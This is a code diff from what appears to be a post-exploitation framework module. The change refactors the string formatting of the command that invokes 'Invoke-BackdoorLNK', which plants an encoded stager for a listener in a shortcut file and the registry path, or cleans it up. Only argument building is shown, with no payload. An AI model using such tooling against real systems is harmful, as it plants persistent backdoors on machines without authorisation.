@@ -66,11 +66,9 @@ class Module:
 
         if cleanup.lower() == "true":
             script_end += " -CleanUp"
-            script_end += " -LNKPath '%s'" % (lnk_path)
-            script_end += " -RegPath '%s'" % (reg_path)
-            script_end += "; \"Invoke-BackdoorLNK cleanup run on lnk path '{}' and regPath {}\"".format(
-                lnk_path, reg_path
-            )
+            script_end += f" -LNKPath '{lnk_path}'"
+            script_end += f" -RegPath '{reg_path}'"
+            script_end += f"; \"Invoke-BackdoorLNK cleanup run on lnk path '{lnk_path}' and regPath {reg_path}\""
 
         else:
             if ext_file != "":
@@ -112,11 +110,9 @@ class Module:
                     encScript = launcher.split(" ")[-1]
                     status_msg += "using listener " + listener_name
 
-            script_end += " -LNKPath '%s'" % (lnk_path)
-            script_end += " -EncScript '%s'" % (encScript)
-            script_end += "; \"Invoke-BackdoorLNK run on path '{}' with stager for listener '{}'\"".format(
-                lnk_path, listener_name
-            )
+            script_end += f" -LNKPath '{lnk_path}'"
+            script_end += f" -EncScript '{encScript}'"
+            script_end += f"; \"Invoke-BackdoorLNK run on path '{lnk_path}' with stager for listener '{listener_name}'\""
 
         script = main_menu.modulesv2.finalize_module(
             script=script,
